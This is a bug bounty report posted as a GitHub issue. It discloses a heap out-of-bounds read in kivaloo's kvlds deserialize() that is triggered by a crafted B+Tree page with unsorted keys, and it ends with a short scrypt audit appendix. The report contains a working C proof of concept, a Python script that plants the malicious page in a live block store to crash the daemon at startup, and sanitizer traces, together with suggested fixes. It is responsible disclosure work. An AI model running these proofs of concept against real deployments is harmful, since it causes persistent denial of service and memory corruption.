# Bug Bounty Report — Kivaloo: heap out-of-bounds read in kvlds deserialize() via unsorted keys in a crafted B+Tree page

- URL: https://github.com/Tarsnap/tarsnap/issues/715
- Repo: Tarsnap/tarsnap (language: C)
- State: open; created 2026-07-14T05:29:39Z; status ok; passes main

## Issue body

reporter (NONE) · chengdazhi · 2026-07-14T05:29:39Z · https://github.com/Tarsnap/tarsnap/issues/715


## Summary

`kvlds` (the Kivaloo key-value store daemon) trusts B+Tree pages read from its
block store (LBS) without validating that the keys inside a leaf page are in
sorted order. `deserialize()` in `kvlds/serialize.c` computes the shared prefix
length of a leaf's keys with `kvldskey_mlen(first_key, last_key)`, a function
whose correctness relies on the invariant `first_key < last_key`. A crafted
leaf page with an out-of-order key pair breaks that invariant and turns
`kvldskey_mlen()` into a linear scan that reads **past the end of the
heap-allocated page buffer** (up to 255 bytes beyond it).

This is reachable whenever `kvlds` fetches a page from the block store:

1. **At startup**: `btree_init()` scans blocks backwards from the last block
   and calls `deserialize()` on every candidate root page. A crafted page
   placed at the end of the block store makes kvlds abort during startup.
2. **At runtime**: every cache-miss page fetch (`callback_fetch()` in
   `kvlds/btree_node.c`) runs the same deserialization on data received over
   the wire from LBS.

Verified against kivaloo @ `8635364` (current HEAD at time of writing) with an
ASan+UBSan build; both a standalone unit PoC and an end-to-end reproduction
against a live lbs+kvlds deployment are included below.

## Root cause

`lib/datastruct/kvldskey.c`:

```c
size_t
kvldskey_mlen(const struct kvldskey * x, const struct kvldskey * y)
{
        size_t mlen;
        mlen = 0;
        do {
                if (x->len == mlen)
                        break;
                /*
                 * ${y} is greater than ${x}, which is greater than their
                 * shared ${mlen}-byte prefix; so ${y} must also have length
                 * greater than ${mlen}.  Do the two keys match in their
                 * next position?
                 */
                if (x->buf[mlen] != y->buf[mlen])   /* <-- OOB read if y shorter than assumed */
                        break;
                mlen += 1;
        } while (1);
        return (mlen);
}
```

The loop only bounds `mlen` by `x->len`; `y->buf[mlen]` is read under the
assumption that `x < y` (lexicographically), which guarantees `y->len > mlen`
whenever `x->len > mlen`. That assumption is never validated on pages loaded
from disk/network.

`kvlds/serialize.c`, leaf parsing path of `deserialize()` (line ~254–281):

```c
        /* Parse keys. */                     /* <-- no ordering check */
        for (i = 0; i < N->nkeys; i++) { ... }

        /* Parse values. */
        for (i = 0; i < N->nkeys; i++) { ... }

        /* Figure out how far the keys match. */
        if (N->nkeys > 0) {
                N->mlen_n = (uint8_t)kvldskey_mlen(N->u.pairs[0].k,
                    N->u.pairs[N->nkeys - 1].k);
        }
```

If `pairs[0].k` is a long key whose bytes are all equal to the bytes that
follow `pairs[nkeys-1].k` in the page (trivially arranged: key #0 = 255 zero
bytes, key #1 = empty key, values = empty keys, zero padding), the loop walks
off the end of the `malloc(buflen)`'d page copy.

## Threat model / trigger paths

kvlds treats the block store as trusted, but per the kivaloo INTERFACES
document the wire protocol between components has "no encryption,
authentication, or authorization mechanisms", and block contents are not
authenticated beyond an error-detecting CRC. Concretely, a malicious page can
arrive via:

- **Network-attached block stores**: `lbs-s3` fetches blocks from S3 over the
  network; `lbs` can equally be run as a remote daemon. Anyone able to inject
  or modify blocks (compromised/MITM'd storage endpoint, malicious storage
  server, bucket write access) controls the bytes `deserialize()` parses.
- **Local disk corruption / tampering**: bit rot or any local attacker with
  write access to the storage directory. CRC32C protects only in-transit, not
  at-rest, data.

Because `btree_init()` (kvlds/btree.c:261) scans backwards from the last block
and deserializes each candidate page, planting a crafted page as the last
block crashes kvlds on every startup until the storage is manually repaired —
a persistent denial of service. The same code path (`callback_fetch()` in
kvlds/btree_node.c:325) runs on any runtime page fetch.

## Impact

- **Memory-safety violation**: heap out-of-bounds read of up to 255 bytes past
  the page buffer (bounded by the maximum serialized key length, 255 bytes).
  Deterministic abort under ASan (see below).
- **Crash / persistent DoS in production**: the over-read is a linear scan
  that stops at the first non-matching byte. With the maximum block size of
  128 KiB (`PROTO_LBS_BLKLEN_MAX`), `malloc(131072)` is served by `mmap` on
  mainstream allocators (glibc default mmap threshold is 128 KiB), so the scan
  can run off the end of the mapping into an unmapped page and SIGSEGV the
  daemon. With small block sizes it reads adjacent heap.
- **Integrity**: in non-sanitized builds the read usually "succeeds", yielding
  a garbage `mlen_n` for a node whose keys are out of order. `mlen_n`/`mlen_t`
  feed `kvldskey_cmp2()` in `btree_find.c:54,95` and `btree_mutate.c`, so a
  single crafted page silently breaks B+Tree ordering invariants — lookups can
  return wrong results and subsequent merge/split operations run on an
  inconsistent tree. The full consequences of operating on a tree with
  unsorted keys were not exhaustively explored and may include further memory
  unsafety.

## Reproduction

### A. Standalone unit PoC

```c
/* poc_deserialize_oob.c — build with:
 *   clang -g -fsanitize=address,undefined -Ikvlds -Ilib/datastruct \
 *         -Ilibcperciva/util poc_deserialize_oob.c kvlds/serialize.c \
 *         kvlds/node.c lib/datastruct/kvldskey.c libcperciva/util/warnp.c \
 *         -o poc
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "node.h"
#include "serialize.h"

int main(void)
{
        struct node * N;
        uint8_t page[512];
        size_t pos;

        memset(page, 0, sizeof(page));
        memcpy(page, "KVLDS\0", 6);
        page[6] = 0; page[7] = 2;       /* nkeys = 2 (BE) */
        page[8] = 0x00;                 /* non-root leaf */
        page[9] = 0x00;                 /* mlen_t */
        pos = 10;
        page[pos++] = 255; pos += 255;  /* key #0: 255 zero bytes */
        page[pos++] = 0;                /* key #1: empty (UNSORTED) */
        page[pos++] = 0;                /* value #0: empty */
        page[pos++] = 0;                /* value #1: empty */
        /* zero padding to 512 bytes is format-valid */

        N = calloc(1, sizeof(struct node));
        N->type = NODE_TYPE_READ;
        N->state = NODE_STATE_CLEAN;
        deserialize(N, page, sizeof(page));
        return (0);
}
```

Result (kivaloo @ 8635364):

```
==46990==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x615000000280
READ of size 1
    #0 kvldskey_mlen kvldskey.c:126
    #1 deserialize serialize.c:277
0x615000000280 is located 0 bytes after 512-byte region
allocated by: malloc deserialize serialize.c:205
```

### B. End-to-end (live lbs + kvlds, ASan+UBSan build)

```sh
# 1. Start a local block store and kvlds, generate some state, then stop both.
./lbs/lbs -s stor/sock_lbs -d stor -b 512 &
./kvlds/kvlds -s stor/sock_kvlds -l stor/sock_lbs &
# ... issue a few legitimate SET/GET requests ...
kill <kvlds pid>; kill <lbs pid>

# 2. Plant the crafted page as the next (last) block:
python3 - <<'EOF'
page = bytearray(512)
page[0:6] = b'KVLDS\x00'
page[6] = 0; page[7] = 2          # nkeys = 2
page[8] = 0                       # non-root leaf
pos = 10
page[pos] = 255; pos += 1 + 255   # key0: 255 zero bytes
page[pos] = 0; pos += 1           # key1: empty (unsorted)
page[pos] = 0; pos += 1           # val0
page[pos] = 0; pos += 1           # val1
open('stor/blks_0000000000000005', 'wb').write(bytes(page))  # next blk no.
EOF

# 3. Restart; kvlds deserializes the crafted last block during the
#    root-scan in btree_init() and aborts at startup:
./lbs/lbs -s stor/sock_lbs -d stor -b 512 &
./kvlds/kvlds -s stor/sock_kvlds -l stor/sock_lbs
```

Result:

```
==47435==ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1
    #0 kvldskey_mlen kvldskey.c:126
    #1 deserialize serialize.c:277
    #2 callback_fetch btree_node.c:325
    #3 callback_get proto_lbs_client.c:288
    #4 readpackets wire_requestqueue.c:88
    #5 callback_wait_gotdata wire_readpacket.c:190
    #6 events_spin events.c:217
    #7 btree_init btree.c:282
    #8 main main.c:241
```

The daemon cannot start until the offending block is manually removed.

## Suggested fix

Defense in depth, both of:

1. In `deserialize()` (kvlds/serialize.c), validate strict key ordering while
   parsing — e.g. for leaf pages
   `kvldskey_cmp(N->u.pairs[i-1].k, N->u.pairs[i].k) < 0` for all `i`, and the
   analogous check for separator keys in parent pages — rejecting the page
   (fail-stop, consistent with existing "Invalid page read" handling) before
   `kvldskey_mlen()` is ever called. Validating `mlen_t` consistency at the
   same time would also harden the parent-page path.
2. Make `kvldskey_mlen()` robust regardless of caller assumptions by also
   terminating when `y->len == mlen` (mirror of the existing `x->len == mlen`
   check), so it can never read past either key even if other callers'
   invariants are violated.

## De-duplication

Checked 2026-07-14:

- Tarsnap/tarsnap issues titled "Bug Bounty Report": #709–#714 (all spiped;
  #714 is our prior network_connect UAF report) and closed #679 (tarsnap
  CLI) — none touch kivaloo.
- Tarsnap/tarsnap issue #362 "bug bounty" — cosmetic website typo, unrelated.
- Tarsnap/kivaloo open issues (#155, #181, #238, #272) and a search for
  mlen/deserialize/sort-related reports — nothing related.
- kivaloo git history for kvlds/serialize.c and lib/datastruct/kvldskey.c
  through HEAD (8635364): no fix; nearby hardening commits (e.g. 45aa85c,
  "sanity check for N->height") show this path is under active review but
  key-order validation was not added.

---

# Appendix: scrypt audit — negative result (with one low-severity note)

Scope: scrypt @ `bc10851` (HEAD). Full read of `lib/scryptenc/scryptenc.c`
(file format parse, header checksum/HMAC verification, parameter checks),
`lib/crypto/crypto_scrypt-ref.c` and `lib-platform/crypto/crypto_scrypt.c`
(KDF memory-sizing and overflow guards), `lib/crypto/crypto_scrypt_smix.c`,
`main.c` (CLI parsing), `lib/util/passphrase_entry.c`,
`lib-platform/util/memlimit.c`, `libcperciva/util/readpass{,_file}.c`,
`scryptenc_cpuperf.c`.

Testing performed (ASan+UBSan, `-fno-sanitize-recover=all`):

- Mutational fuzzing of `scryptdec_buf`, `scryptdec_file` (prep+copy) and
  `scryptdec_file_printparams`, plus a structure-aware mode that drives
  `scryptenc_buf`/`scryptdec_buf` round-trips with fuzz-derived explicit
  parameters (logN/r/p) to reach `crypto_scrypt` and its OOM error paths:
  **3,000,000+ iterations, no sanitizer findings** (harness and seeds in
  ~/money_run/work/scrypt-build/).
- Systematic OOM injection: all of `malloc/calloc/realloc/strdup/
  posix_memalign` interposed and failed at every allocation index 1..300
  across the encrypt-buf, decrypt-buf, decrypt-file (prep+copy),
  encrypt-file, and info workflows: **no UAF / double-free / NULL-deref**;
  error paths are clean (the recent defa711 humansize-NULL fix is effective).
  Two trivial `key_enc_exp` leaks on fwrite-failure paths
  (scryptenc.c:652–656 and 870–874) were noted; not security-relevant.

Low-severity note (reported here for completeness; likely below bounty
threshold): `scrypt info` on a crafted file triggers undefined behavior at
`lib/scryptenc/scryptenc.c:74`:

```c
uint64_t N = (uint64_t)(1) << logN;   /* logN = header[7], 0..255, unchecked */
```

`scryptdec_file_printparams()` calls `display_params()` with the raw header
byte before any range check (the header checksum is verified only in the
decrypt path, not in info mode). logN ≥ 64 is a too-large shift (confirmed
under UBSan: "shift exponent 255 is too large for 64-bit type"). On x86/arm64
the shift count is masked, so the practical effect is a wrong value printed
by `scrypt info`; no memory unsafety observed. Suggest clamping logN to
1..63 (or rejecting ≥ 64) in `scryptdec_file_printparams()`.

---
*Disclosure note: this bug was found with the assistance of an AI coding agent running under my supervision; all analysis and reproduction were verified locally (macOS, Apple clang ASan/UBSan). Happy to remain pseudonymous under this GitHub handle for bounty purposes. PoC sources available on request.*

